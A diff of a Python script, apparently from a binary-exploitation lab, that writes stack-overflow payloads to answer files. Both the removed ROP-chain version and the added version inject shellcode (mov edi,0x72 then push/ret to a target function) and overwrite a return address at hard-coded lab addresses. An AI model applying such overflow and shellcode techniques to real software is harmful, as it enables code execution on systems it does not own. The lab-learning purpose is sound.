@@ -27,19 +27,16 @@ with open("ans2.txt", "wb") as f:
     f.write(payload)
 print("Payload written to ans.txt")
 '''
-import struct
-# 你的精简机器码（mov edi,0x72 + jmp func1）
-SHELLCODE = bytes.fromhex("bf72000000e9f5114000")
 
-payload = (
-    b'A'*40                      # 固定padding
-    + struct.pack('<Q', 0x40101a)# 纯ret（栈对齐）
-    + struct.pack('<Q', 0x4012f1)# mov_rax地址
-    + struct.pack('<Q', 0x40131e)# mov_rax的返回地址（jmp_x，合法Gadget）
-    + struct.pack('<Q', 0x7fffffffe0e0)# mov_rax的入参（buffer地址）
-    + SHELLCODE                  # 赋值机器码
-)
+# 弄一个汇编指令 move edi 0x72
+assign_machine_code = b"\xbf\x72\x00\x00\x00"
+# push 0x401216 + ret → 机器码：0x68 16 12 40 00 + 0xc3
+jmp_func1_code = b"\x68\x16\x12\x40\x00\xc3"
 
+payload = assign_machine_code + jmp_func1_code  
+payload = payload.ljust(40, b"A")            
+payload += b"\x34\x13\x40\x00\x00\x00\x00\x00" # retaddr 变成 jmp_xs 
+      
 # 写入文件
 with open("ans3.txt", "wb") as f:
     f.write(payload)
